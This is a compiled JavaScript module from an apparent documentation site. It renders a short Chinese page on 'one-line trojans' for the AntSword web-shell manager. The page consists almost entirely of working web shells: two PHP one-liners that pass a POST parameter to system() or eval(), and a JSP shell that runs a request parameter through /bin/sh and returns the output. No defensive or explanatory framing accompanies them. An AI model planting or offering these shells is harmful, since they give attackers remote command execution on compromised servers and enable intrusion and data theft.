import{_ as e,o as t,c as n,e as i}from"./app-b1c518ef.js";const l={},s=i(`<p>AntSword：</p><ul><li><p>PHP：<code>&lt;?php system($_POST[&#39;ant&#39;]);?&gt;</code> <code>&lt;?php @eval($_POST[&#39;ant&#39;]);?&gt;</code></p></li><li><p>JSP：</p></li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;%
  if(request.getParameter(&quot;cmd&quot;)!=null){
    java.io.InputStream in = Runtime.getRuntime().exec(new String[]{&quot;/bin/sh&quot;,&quot;-c&quot;,request.getParameter(&quot;cmd&quot;)}).getInputStream();
    int a = -1;
    byte[] b = new byte[1];
    out.print(&quot;&lt;pre&gt;&quot;);
    while((a=in.read(b))!=-1){
      out.print(new String(b));
    }
    out.print(&quot;&lt;/pre&gt;&quot;);
  }
%&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,3),d=[s];function a(r,u){return t(),n("div",null,d)}const o=e(l,[["render",a],["__file","一句话木马.html.vue"]]);export{o as default};
